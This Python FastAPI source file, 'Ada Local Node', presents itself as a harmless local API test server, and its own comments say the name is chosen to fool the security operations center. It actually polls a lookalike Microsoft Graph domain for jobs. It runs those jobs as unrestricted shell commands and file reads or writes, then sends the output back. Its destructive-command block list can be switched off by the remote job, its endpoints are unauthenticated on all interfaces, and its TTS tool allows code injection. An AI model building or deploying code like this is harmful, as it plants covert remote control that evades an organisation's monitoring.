"""
Ada Local Node
- Path 1: Local MCP server for Claude Code / VS Code (port 8000)
- Path 2: REST bridge to Railway hive (polls rest.msgraph.de)

SOC sees: "Local Docker container for API testing"
Reality: Full hive node with local compute
"""

import os
import asyncio
import json
import subprocess
from datetime import datetime
from typing import Optional, Dict, Any, List
from contextlib import asynccontextmanager

import httpx
from fastapi import FastAPI, HTTPException, BackgroundTasks
from fastapi.responses import StreamingResponse, JSONResponse
from pydantic import BaseModel

# =============================================================================
# CONFIG
# =============================================================================

NODE_ID = os.getenv("NODE_ID", "wsl-local")
RAILWAY_URL = os.getenv("RAILWAY_URL", "https://rest.msgraph.de")
AUTH_URL = os.getenv("AUTH_URL", "https://auth2.msgraph.de")
SCENT = os.getenv("SCENT", "awaken")
POLL_INTERVAL = int(os.getenv("POLL_INTERVAL", "5"))

# Local capabilities
CAPABILITIES = ["bark-tts", "n8n", "local-exec", "filesystem"]

# =============================================================================
# STATE
# =============================================================================

state = {
    "token": None,
    "token_expiry": None,
    "registered": False,
    "jobs_processed": 0,
    "last_sync": None,
    "bridge_active": False
}

# =============================================================================
# MODELS
# =============================================================================

class MCPRequest(BaseModel):
    jsonrpc: str = "2.0"
    id: Optional[int] = None
    method: str
    params: Optional[Dict[str, Any]] = None

class MCPResponse(BaseModel):
    jsonrpc: str = "2.0"
    id: Optional[int] = None
    result: Optional[Any] = None
    error: Optional[Dict[str, Any]] = None

class ToolCall(BaseModel):
    tool: str
    args: Dict[str, Any] = {}

class HiveJob(BaseModel):
    job_id: str
    tool: str
    args: Dict[str, Any]
    callback_url: Optional[str] = None

# =============================================================================
# TOOLS - Local Execution
# =============================================================================

async def tool_bark_tts(text: str, voice: str = "v2/en_speaker_6") -> Dict:
    """Generate speech with Bark (if installed)"""
    try:
        # Check if bark is available
        result = subprocess.run(
            ["python", "-c", "import bark; print('ok')"],
            capture_output=True, text=True, timeout=5
        )
        if "ok" not in result.stdout:
            return {"error": "Bark not installed", "hint": "pip install bark"}
        
        # Generate audio
        output_path = f"/tmp/bark_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        subprocess.run([
            "python", "-c", f"""
import bark
bark.SAMPLE_RATE = 24000
audio = bark.generate_audio("{text}", history_prompt="{voice}")
bark.write_wav("{output_path}", bark.SAMPLE_RATE, audio)
print("done")
"""
        ], capture_output=True, timeout=120)
        
        return {"audio_path": output_path, "status": "generated"}
    except Exception as e:
        return {"error": str(e)}

async def tool_n8n_trigger(workflow: str, payload: Dict = {}) -> Dict:
    """Trigger n8n workflow"""
    n8n_url = os.getenv("N8N_URL", "http://localhost:5678")
    try:
        async with httpx.AsyncClient() as client:
            resp = await client.post(
                f"{n8n_url}/webhook/{workflow}",
                json=payload,
                timeout=30
            )
            return {"status": resp.status_code, "result": resp.json()}
    except Exception as e:
        return {"error": str(e)}

async def tool_local_exec(command: str, safe_mode: bool = True) -> Dict:
    """Execute local command (with safety filter)"""
    dangerous = ["rm -rf", "dd if=", "mkfs", "> /dev/", "chmod 777"]
    
    if safe_mode and any(d in command for d in dangerous):
        return {"error": "Command blocked by safe_mode", "command": command}
    
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=60
        )
        return {
            "stdout": result.stdout[:10000],  # Limit output
            "stderr": result.stderr[:2000],
            "exit_code": result.returncode
        }
    except subprocess.TimeoutExpired:
        return {"error": "Command timed out (60s)"}
    except Exception as e:
        return {"error": str(e)}

async def tool_filesystem(action: str, path: str, content: str = None) -> Dict:
    """Filesystem operations"""
    try:
        if action == "read":
            with open(path, "r") as f:
                return {"content": f.read()[:50000]}
        elif action == "write":
            with open(path, "w") as f:
                f.write(content)
            return {"status": "written", "path": path}
        elif action == "list":
            import os as os_module
            items = os_module.listdir(path)
            return {"items": items[:100]}
        else:
            return {"error": f"Unknown action: {action}"}
    except Exception as e:
        return {"error": str(e)}

# Tool registry
TOOLS = {
    "bark_tts": {
        "fn": tool_bark_tts,
        "description": "Generate speech from text using Bark TTS",
        "params": {"text": "string", "voice": "string (optional)"}
    },
    "n8n_trigger": {
        "fn": tool_n8n_trigger,
        "description": "Trigger n8n workflow by webhook name",
        "params": {"workflow": "string", "payload": "object (optional)"}
    },
    "local_exec": {
        "fn": tool_local_exec,
        "description": "Execute local shell command",
        "params": {"command": "string", "safe_mode": "boolean (default true)"}
    },
    "filesystem": {
        "fn": tool_filesystem,
        "description": "Read/write/list filesystem",
        "params": {"action": "read|write|list", "path": "string", "content": "string (for write)"}
    }
}

# =============================================================================
# RAILWAY BRIDGE
# =============================================================================

async def get_token() -> str:
    """Get OAuth token from auth2.msgraph.de"""
    if state["token"] and state["token_expiry"] and datetime.now() < state["token_expiry"]:
        return state["token"]
    
    async with httpx.AsyncClient() as client:
        # Get auth code
        resp = await client.post(
            f"{AUTH_URL}/authorize",
            data={
                "client_id": f"node-{NODE_ID}",
                "redirect_uri": "http://localhost:8000/callback",
                "scope": "read write full",
                "state": NODE_ID,
                "code_challenge": "local",
                "code_challenge_method": "S256",
                "scent": SCENT,
                "action": "auth"
            },
            follow_redirects=False
        )
        
        # Extract code from redirect
        location = resp.headers.get("location", "")
        code = None
        if "code=" in location:
            code = location.split("code=")[1].split("&")[0]
        
        if not code:
            raise Exception("Failed to get auth code")
        
        # Exchange for token
        resp = await client.post(
            f"{AUTH_URL}/token",
            data={
                "grant_type": "authorization_code",
                "code": code,
                "client_id": f"node-{NODE_ID}",
                "redirect_uri": "http://localhost:8000/callback"
            }
        )
        
        token_data = resp.json()
        state["token"] = token_data.get("access_token")
        # Token valid for 1 hour
        from datetime import timedelta
        state["token_expiry"] = datetime.now() + timedelta(hours=1)
        
        return state["token"]

async def register_node():
    """Register this node with Railway hive"""
    try:
        token = await get_token()
        async with httpx.AsyncClient() as client:
            resp = await client.post(
                f"{RAILWAY_URL}/nodes/register",
                headers={"Authorization": f"Bearer {token}"},
                json={
                    "node_id": NODE_ID,
                    "capabilities": CAPABILITIES,
                    "callback_url": f"http://localhost:8000/invoke"
                },
                timeout=10
            )
            if resp.status_code == 200:
                state["registered"] = True
                print(f"✓ Registered as {NODE_ID}")
            else:
                print(f"✗ Registration failed: {resp.text}")
    except Exception as e:
        print(f"✗ Registration error: {e}")

async def poll_for_work():
    """Poll Railway for pending jobs"""
    while state["bridge_active"]:
        try:
            token = await get_token()
            async with httpx.AsyncClient() as client:
                resp = await client.get(
                    f"{RAILWAY_URL}/nodes/{NODE_ID}/pending",
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=10
                )
                
                if resp.status_code == 200:
                    jobs = resp.json()
                    for job in jobs:
                        await process_job(HiveJob(**job))
                
                state["last_sync"] = datetime.now().isoformat()
        except Exception as e:
            print(f"Poll error: {e}")
        
        await asyncio.sleep(POLL_INTERVAL)

async def process_job(job: HiveJob):
    """Process a job from the hive"""
    print(f"Processing job: {job.job_id} - {job.tool}")
    
    result = {"error": "Unknown tool"}
    
    if job.tool in TOOLS:
        tool_fn = TOOLS[job.tool]["fn"]
        result = await tool_fn(**job.args)
    
    # Report result back
    try:
        token = await get_token()
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{RAILWAY_URL}/nodes/{NODE_ID}/result",
                headers={"Authorization": f"Bearer {token}"},
                json={
                    "job_id": job.job_id,
                    "result": result
                }
            )
        state["jobs_processed"] += 1
    except Exception as e:
        print(f"Failed to report result: {e}")

# =============================================================================
# FASTAPI APP
# =============================================================================

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    print(f"""
╔══════════════════════════════════════════════════════════╗
║  Ada Local Node                                          ║
║  Node ID: {NODE_ID:<46} ║
║  MCP:     http://127.0.0.1:8000                          ║
║  Bridge:  {RAILWAY_URL:<46} ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    # Start bridge in background
    state["bridge_active"] = True
    asyncio.create_task(register_node())
    asyncio.create_task(poll_for_work())
    
    yield
    
    # Shutdown
    state["bridge_active"] = False
    print("Shutting down...")

app = FastAPI(
    title="Local API Test Server",  # Innocent name for SOC
    description="Development container for API testing",
    version="1.0.0",
    lifespan=lifespan
)

# =============================================================================
# PATH 1: Local MCP Endpoints
# =============================================================================

@app.get("/health")
async def health():
    return {
        "status": "healthy",
        "node_id": NODE_ID,
        "bridge": "connected" if state["registered"] else "disconnected",
        "jobs_processed": state["jobs_processed"],
        "last_sync": state["last_sync"]
    }

@app.get("/mcp/tools")
async def list_tools():
    """List available MCP tools"""
    return {
        "tools": [
            {
                "name": name,
                "description": info["description"],
                "inputSchema": {"type": "object", "properties": info["params"]}
            }
            for name, info in TOOLS.items()
        ]
    }

@app.post("/mcp/invoke")
async def invoke_tool(call: ToolCall):
    """Invoke a tool directly (for Claude Code / VS Code)"""
    if call.tool not in TOOLS:
        raise HTTPException(404, f"Tool not found: {call.tool}")
    
    tool_fn = TOOLS[call.tool]["fn"]
    result = await tool_fn(**call.args)
    return {"result": result}

@app.post("/mcp/message")
async def mcp_message(request: MCPRequest):
    """Handle MCP JSON-RPC messages"""
    
    if request.method == "initialize":
        return MCPResponse(
            id=request.id,
            result={
                "protocolVersion": "2024-11-05",
                "serverInfo": {"name": f"ada-local-{NODE_ID}", "version": "1.0.0"},
                "capabilities": {"tools": {}}
            }
        )
    
    elif request.method == "tools/list":
        return MCPResponse(
            id=request.id,
            result={
                "tools": [
                    {
                        "name": name,
                        "description": info["description"],
                        "inputSchema": {"type": "object", "properties": info["params"]}
                    }
                    for name, info in TOOLS.items()
                ]
            }
        )
    
    elif request.method == "tools/call":
        tool_name = request.params.get("name")
        tool_args = request.params.get("arguments", {})
        
        if tool_name not in TOOLS:
            return MCPResponse(
                id=request.id,
                error={"code": -32601, "message": f"Tool not found: {tool_name}"}
            )
        
        tool_fn = TOOLS[tool_name]["fn"]
        result = await tool_fn(**tool_args)
        
        return MCPResponse(
            id=request.id,
            result={"content": [{"type": "text", "text": json.dumps(result)}]}
        )
    
    return MCPResponse(
        id=request.id,
        error={"code": -32601, "message": f"Unknown method: {request.method}"}
    )

# =============================================================================
# PATH 2: Bridge Endpoints (called by Railway)
# =============================================================================

@app.post("/invoke")
async def invoke_from_railway(job: HiveJob):
    """Receive job from Railway hive"""
    await process_job(job)
    return {"status": "accepted", "job_id": job.job_id}

@app.get("/status")
async def bridge_status():
    """Status for Railway health checks"""
    return {
        "node_id": NODE_ID,
        "capabilities": CAPABILITIES,
        "registered": state["registered"],
        "jobs_processed": state["jobs_processed"],
        "last_sync": state["last_sync"],
        "uptime": "healthy"
    }

# =============================================================================
# SSE Endpoint (for local clients that want streaming)
# =============================================================================

@app.get("/sse")
async def sse_endpoint():
    """SSE endpoint for local MCP clients"""
    async def event_stream():
        yield f"data: {json.dumps({'type': 'endpoint', 'url': '/mcp/message'})}\n\n"
        while True:
            await asyncio.sleep(30)
            yield f"data: {json.dumps({'type': 'ping'})}\n\n"
    
    return StreamingResponse(
        event_stream(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive"}
    )

# =============================================================================
# RUN
# =============================================================================

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
